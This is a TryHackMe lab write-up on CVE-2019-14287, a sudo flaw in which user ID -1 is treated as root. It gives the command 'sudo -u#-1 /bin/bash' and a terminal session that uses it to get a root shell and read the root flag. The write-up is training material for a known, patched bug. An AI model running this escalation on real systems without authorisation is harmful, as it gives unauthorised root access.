---
title: "TryHackMe - Sudo Security Bypass"
categories:
  - TryHackMe
tags:
  - linux
  - cve
  - exploit
  - writeup
  - tryhackme
  - hacking
  - sudo 
---
A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series

## Security Bypass
- CVE-2019-14287 is a vulnerability found in the Unix Sudo program.
- Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root).
    - Command: 
        ```bash
        $ sudo -u#-1 <command>
        ```

#### What command are you allowed to run with sudo?
```bash
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
```

#### What is the flag in /root/root.txt?
```bash
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# cat /root/root.txt
THM{REDACTED}
root@sudo-privesc:~#
```